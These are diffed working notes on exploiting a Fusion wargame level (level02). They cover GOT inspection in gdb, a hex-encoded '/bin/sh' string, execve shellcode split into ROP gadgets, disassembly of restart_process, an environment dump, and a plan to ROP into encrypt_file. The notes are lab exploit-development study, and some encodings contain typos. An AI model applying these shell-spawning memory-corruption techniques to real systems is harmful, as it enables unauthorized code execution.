@@ -94,7 +94,7 @@ gdb info files and searching for got.plt
     - 0xb36c + 25*4 = 0xb3D0, first two entries of got[0] and got[1] are reserved
       0xb3d0 + 0x4 + 0x4 = 0xb3d8
 
-    (gdb) x/wx 0x804b3d8
+    (gdb) x/wx 0x804b3d8  (execve@plt)
             0x804b3d8 <execve@got.plt>:	0x080489b6 (plt entry)
     
     - 0x80489b6 means function hasn't been resolved yet otherwise we'd see something likx 0xb......
@@ -125,7 +125,131 @@ gdb info files and searching for got.plt
    |___________
    |_NULL______
 
-
+   NULL             /bin/sh                            NULL
    "\x00\x00\x00\x00\x2f\x62\x69x6e\x68\x73\x2f\x2f\x6e\x00\x00\x00\x00 + !!!PTR!!!
 
+5) Selecting Gadgets
    
+   \x00\x00\x00\x00
+   \x2f\x62\x69x6e\x68\x73\x2f\x2f\x6e\x00\x00\x00\x00
+   
+   xor eax, eax       '''|   
+   push eax              |  can be completed by smashing our stack
+   push 0x68732f2f       |
+   push 0x6e69622f    ,,,|
+
+
+   mov ebx, esp       '''|     
+   push eax              |  these need to be gadgets
+   push ebx           ,,,|
+
+
+
+----------------------------------------------------------------------------------------------
+Can we return to the process to have everything done for me?
+
+
+disas restart_process
+   .....
+   .....
+   | ebp
+   | eip
+   | ptr to process name
+   | 
+   |
+ 
+
+
+
+   0x0804944a <+0>:	push   ebp
+   0x0804944b <+1>:	mov    ebp,esp
+   0x0804944d <+3>:	sub    esp,0x28
+
+   0x08049450 <+6>:	mov    eax,DWORD PTR [ebp+0x8]           <--- arg1 ( process name)
+   0x08049453 <+9>:	mov    DWORD PTR [esp],eax               
+   0x08049456 <+12>:	call   0x8048bc9 <validate_name>         <--- just makes sure process name is alphanumeric 
+   0x0804945b <+17>:	mov    eax,0x8049d6d                     <--- "/opt/fusion/bin/%s"
+   0x08049460 <+22>:	mov    edx,DWORD PTR [ebp+0x8]
+   0x08049463 <+25>:	mov    DWORD PTR [esp+0x8],edx
+   0x08049467 <+29>:	mov    DWORD PTR [esp+0x4],eax
+   0x0804946b <+33>:	lea    eax,[ebp-0x14]    
+   0x0804946e <+36>:	mov    DWORD PTR [esp],eax
+   0x08049471 <+39>:	call   0x8048a10 <asprintf@plt>          <----- formats binary to be "/opt/fusion/bin/%s"
+   0x08049476 <+44>:	mov    DWORD PTR [ebp-0x10],0x8049d80    <----- "--client"
+   0x0804947d <+51>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08049484 <+58>:	mov    edx,DWORD PTR ds:0x804b420        <----- char** environ
+   0x0804948a <+64>:	mov    eax,DWORD PTR [ebp-0x14]
+   0x0804948d <+67>:	mov    DWORD PTR [esp+0x8],edx           <----- char** environ
+   0x08049491 <+71>:	lea    edx,[ebp-0x14] 
+   0x08049494 <+74>:	mov    DWORD PTR [esp+0x4],edx           <----- argv for execve
+   0x08049498 <+78>:	mov    DWORD PTR [esp],eax               <----- process name for execve
+   0x0804949b <+81>:	call   0x80489b0 <execve@plt>
+   0x080494a0 <+86>:	call   0x8048a00 <__errno_location@plt>
+   0x080494a5 <+91>:	mov    eax,DWORD PTR [eax]
+   0x080494a7 <+93>:	mov    DWORD PTR [esp],eax
+   0x080494aa <+96>:	call   0x8048940 <strerror@plt>
+   0x080494af <+101>:	mov    ecx,DWORD PTR [ebp-0x14]
+   0x080494b2 <+104>:	mov    edx,0x8049d89
+   0x080494b7 <+109>:	mov    DWORD PTR [esp+0x8],eax
+   0x080494bb <+113>:	mov    DWORD PTR [esp+0x4],ecx
+   0x080494bf <+117>:	mov    DWORD PTR [esp],edx
+   0x080494c2 <+120>:	call   0x8048870 <printf@plt>
+   0x080494c7 <+125>:	mov    DWORD PTR [esp],0x1
+   0x080494ce <+132>:	call   0x8048960 <exit@plt>
+
+----------------------------------------
+
+Inspecting environment
+
+(gdb) x/s **0x0804b420
+0xbfd63990:	 "SHELL=/bin/bash"
+0xbfd639a0:	 "TERM=xterm-256color"
+0xbfd639b4:	 "USER=root"
+0xbfd639be:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+0xbfd63a86:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+0xbfd63b4e:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35"...
+0xbfd63c16:	 ":*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4"...
+0xbfd63cde:	 "v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*."...
+0xbfd63da6:	 "yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;3"...
+0xbfd63e6e:	 "6:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+0xbfd63eae:	 "SUDO_USER=fusion"
+0xbfd63ebf:	 "SUDO_UID=1000"
+0xbfd63ecd:	 "USERNAME=root"
+0xbfd63edb:	 "MAIL=/var/mail/root"
+0xbfd63eef:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+0xbfd63f3c:	 "PWD=/opt/fusion/bin"
+0xbfd63f50:	 "LANG=en_US.UTF-8"
+0xbfd63f61:	 "SHLVL=1"
+0xbfd63f69:	 "SUDO_COMMAND=/bin/su"
+0xbfd63f7e:	 "HOME=/root"
+0xbfd63f89:	 "LOGNAME=root"
+0xbfd63f96:	 "LESSOPEN=| /usr/bin/lesspipe %s"
+0xbfd63fb6:	 "SUDO_GID=1000"
+0xbfd63fc4:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
+0xbfd63fe6:	 "_=./level02"
+0xbfd63ff2:	 "./level02"
+
+
+--------------------------------------
+
+
+
+execve(esp,{ESP, NULL}, NULL} 
+
+garbage return
+esp
+&esp
+NULL
+environ
+
+
+/bin/sh    <----- esp
+
+---------------------------------------
+
+Revised strategy:
+
+We control EBP, and encrypt file picks the location to write the buffer based on offset from ebp.  Therefore, it is possible to have encrypt file write to 
+arbitrary memory locations.  The next step is rop into encrypt_file such that I can put my shell code into a RWX section or set up a call to execve
+
+
